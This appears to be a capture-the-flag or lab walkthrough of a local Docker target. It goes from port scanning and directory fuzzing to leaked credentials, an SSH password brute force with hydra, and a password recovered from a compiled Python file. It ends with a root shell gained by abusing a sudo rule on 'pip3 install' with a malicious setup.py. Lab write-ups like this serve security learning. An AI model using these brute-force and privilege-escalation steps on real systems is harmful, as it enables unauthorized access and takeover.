# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.378 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.038 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1012ms
rtt min/avg/max/mdev = 0.038/0.208/0.378/0.170 ms
```
## Ports scanning
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 11:55 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 2E:05:63:71:40:C8 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
```
``` bash
sudo nmap -p22,80 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 11:55 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 2f:87:50:66:15:23:d6:c3:90:3f:ea:8c:a4:4b:b3:ff (RSA)
|   256 d1:35:c1:82:09:e8:c2:c7:cd:98:89:61:c2:6b:14:64 (ECDSA)
|_  256 dd:01:45:ce:bd:a3:05:21:5b:31:4c:2f:df:38:c4:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: 404 Not Found
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 2E:05:63:71:40:C8 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.44 seconds
```
# Web enumeration
## Dir fuzzing
``` bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 589]
notes                (Status: 301) [Size: 308] [--> http://172.17.0.2/notes/]
server-status        (Status: 403) [Size: 275]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
## Exposed credentials
``` bash
curl http://172.17.0.2/notes/note.txt
Dear developer,
Please remember to change your credentials "dev:developer123" to something stronger.
I've already warned you that weak passwords can get us compromised.

-Admin
```
# SSH
``` bash
ssh dev@172.17.0.2
```
Unfortunately, login was unsuccessful with *dev:developer123*
Still dev might be a valid system user
## Brute force with hydra
``` bash
hydra -l dev -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -vV -t 64
[22][ssh] host: 172.17.0.2   login: dev   password: computer
```
# Privilege escalation
``` bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
dev:x:1000:1000::/home/dev:/bin/bash
admin:x:1001:1001::/home/admin:/bin/bash
```
## Lateral movement: dev -> admin
``` bash
find / -name *secret* 2>/dev/null
/opt/scripts/__pycache__/secret.cpython-38.pyc
```
``` bash
strings secret.cpython-38.pyc
adminz
p@$$w0r8321z
Authenticating...)
print)
usernameZ
password
        secret.py
auth
<module>
```
Found credentials *admin:p@$$w0r8321*
``` bash
su admin
```
## Lateral movement: admin -> root
``` bash
sudo -l
(ALL) NOPASSWD: /usr/bin/pip3 install *
```
``` bash
echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' > /tmp/setup.py
cd /tmp
sudo -u root /usr/bin/pip3 install .
Processing /tmp
whoami
root
```
